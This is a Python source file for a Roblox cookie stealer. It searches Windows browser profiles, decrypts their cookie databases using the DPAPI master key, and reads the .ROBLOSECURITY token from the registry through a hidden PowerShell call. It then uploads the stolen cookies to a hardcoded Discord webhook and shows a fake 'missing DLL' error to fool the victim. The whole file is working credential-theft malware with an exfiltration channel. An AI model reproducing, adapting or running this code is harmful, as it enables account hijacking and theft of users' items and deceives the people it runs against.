webhook = "https://discord.com/api/webhooks/1097208095786143774/W1GYzRAiTUcOS-4TQE2ov1tGnheyV2Q8JXAeo8qyzeF2mJYH2U8ZQPdUUPaOytzXxaBS" # WEBHOOK HERE

import os
import json
import ctypes
import random
import string
import base64
import shutil
import sqlite3
import requests
import subprocess

from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES 

show_fake_error: bool = True

def safe(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception:
            pass
    return wrapper

def dll_name() -> str:
    dll_list = ['kernel32.dll', 'user32.dll', 'advapi32.dll', 'msvcrt.dll', 'gdi32.dll', 'comdlg32.dll', 'shell32.dll', 'ole32.dll', 'oleaut32.dll', 'wininet.dll', 'winspool.drv', 'urlmon.dll', 'uuid.dll', 'mpr.dll', 'netapi32.dll', 'version.dll', 'crypt32.dll', 'ws2_32.dll', 'msvcp140.dll', 'vcruntime140.dll', 'shlwapi.dll', 'secur32.dll', 'dbghelp.dll', 'imm32.dll', 'usp10.dll', 'kernelbase.dll', 'userenv.dll', 'cfgmgr32.dll', 'devobj.dll', 'setupapi.dll']
    
    return random.choice(dll_list)

def fake_error_message_box() -> bool:
    ctypes.windll.user32.MessageBoxW(None, f"This application failed to start because {dll_name()} was not found. Re-installing the application may fix this problem.", "Windows - System Error", 0)

class CookieLogger:
    appdata = os.getenv('APPDATA')
    localappdata = os.getenv('LOCALAPPDATA')

    def __init__(self):
        browsers = self.findBrowsers()

        cookies = []
        for browser in browsers:
            try:
                cookies.append(self.getCookie(browser[0], browser[1]))
            except Exception:
                pass

        try:
            cookies.append(("Roblox App", ("None", '\n'.join(line for line in subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip()))))
        except Exception:
            pass
        
        cookieDoc = ""

        for cookie in cookies:
            if cookie == None or not cookie[1]:
                continue

            for _cookie in cookie[1]:
                cookieDoc += f"Browser: {cookie[0]}\nProfile: {_cookie[0]}\nCookie: {_cookie[1]}\n\n"

                if not cookieDoc: cookieDoc = "No Cookies Found!"
                        
        requests.post(webhook, files = {"cookies.txt": cookieDoc})
    
    @safe
    def findBrowsers(self):
        found = []

        for root in [self.appdata, self.localappdata]:
            for directory in os.listdir(root):
                try:
                    for _root, _, _ in os.walk(os.path.join(root, directory)):
                        for file in os.listdir(_root):
                            if file == "Local State":
                                if "Default" in os.listdir(_root):
                                    found.append([_root, True])
                                elif "Login Data" in os.listdir(_root):
                                    found.append([_root, False])
                                else:
                                    pass
                except Exception:
                    pass

        return found

    @safe
    def getMasterKey(self, browserPath):
        with open(os.path.join(browserPath, "Local State"), "r", encoding = "utf8") as f:
            localState = json.loads(f.read())
        
        masterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
        truncatedMasterKey = masterKey[5:]

        return CryptUnprotectData(truncatedMasterKey, None, None, None, 0)[1]

    @safe
    def decryptCookie(self, cookie, masterKey):
        iv = cookie[3:15]
        encryptedValue = cookie[15:]

        cipher = AES.new(masterKey, AES.MODE_GCM, iv)
        decryptedValue = cipher.decrypt(encryptedValue)

        return decryptedValue[:-16].decode()

    @safe
    def getCookie(self, browserPath, isProfiled):

        if browserPath.split("\\")[-1] == "User Data":
            browserName = browserPath.split("\\")[-2]
        else:
            browserName = browserPath.split("\\")[-1]
        
        cookiesFound = []

        profiles = ["Default"]
        try:
            masterKey = self.getMasterKey(browserPath)
        except Exception:
            return cookiesFound

        if isProfiled:
            for directory in os.listdir(browserPath):
                if directory.startswith("Profile"):
                    profiles.append(directory)
        
        if not isProfiled:
            if "Network" in os.listdir(browserPath):
                cookiePath = os.path.join(browserPath, "Network", "Cookies")
            else:
                cookiePath = os.path.join(browserPath, "Cookies")
            
            shutil.copy2(cookiePath, "temp.db")
            connection = sqlite3.connect("temp.db")
            cursor = connection.cursor()

            cursor.execute("SELECT encrypted_value FROM cookies")
            for cookie in cursor.fetchall():
                if cookie[0]:
                    decrypted = self.decryptCookie(cookie[0], masterKey)

                    if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
                        cookiesFound.append(("None", decrypted))
                
            connection.close()
            os.remove("temp.db")
        
        else:
            for profile in profiles:
                if "Network" in os.listdir(os.path.join(browserPath, profile)):
                    cookiePath = os.path.join(browserPath, profile, "Network", "Cookies")
                else:
                    cookiePath = os.path.join(browserPath, profile, "Cookies")

                shutil.copy2(cookiePath, "temp.db")
                connection = sqlite3.connect("temp.db")
                cursor = connection.cursor()

                cursor.execute("SELECT encrypted_value FROM cookies")
                for cookie in cursor.fetchall():
                    if cookie[0]:
                        decrypted = self.decryptCookie(cookie[0], masterKey)

                        if decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"):
                            cookiesFound.append((profile, decrypted))
                
                connection.close()
                os.remove("temp.db")

        return [browserName, cookiesFound]

if __name__ == "__main__":
    CookieLogger()
    
    if show_fake_error == True:
        try:
            fake_error_message_box()
        except:
            pass
    else:
        pass
    
